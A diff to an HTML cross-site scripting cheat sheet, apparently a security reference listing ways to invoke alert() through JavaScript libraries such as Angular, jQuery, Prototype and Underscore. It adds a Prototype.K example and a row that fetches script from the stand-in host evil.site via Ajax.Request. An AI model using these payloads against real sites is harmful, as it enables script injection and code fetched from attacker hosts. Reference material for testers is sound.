@@ -14,6 +14,10 @@ body {
   font-family: open-sans, sans-serif;
 }
 
+.comment {
+  color: gray;
+}
+
 .payload {
   color: red;
 }
@@ -324,7 +328,7 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <tr>
   <td class="example">window[<span class="payload">/alert/.source</span>](9)
 <tr>
-  <td rowspan="9">Harness functions from a JavaScript library
+  <td rowspan="10">Harness functions from a JavaScript library
   <td rowspan="2"><a href="http://angularjs.org/">Angular</a>
   <td class="example">angular.bind(self, alert, 9)()
   <tr>
@@ -338,8 +342,10 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <tr>
   <td class="example">$.globalEval(alert(9))
   <tr>
-  <td><a href="http://prototypejs.org/">Prototype</a>
-  <td class="example">new Ajax.Request('http://evil.site/a.js',<br>{onsuccess:function(transport){transport.headerJSON}})
+  <td rowspan="2"><a href="http://prototypejs.org/">Prototype</a><br><span class="comment">(Ajax will trigger CORS)</span>
+  <td class="example">Prototype.K(alert)(9)
+  <tr>
+  <td class="example">new Ajax.Request('//evil.site/a.js',<br>{onsuccess:function(transport){transport.headerJSON}})
   <tr>
   <td rowspan="3"><a href="http://underscorejs.org/">Underscore</a>
   <td class="example">_.defer(alert, 9)
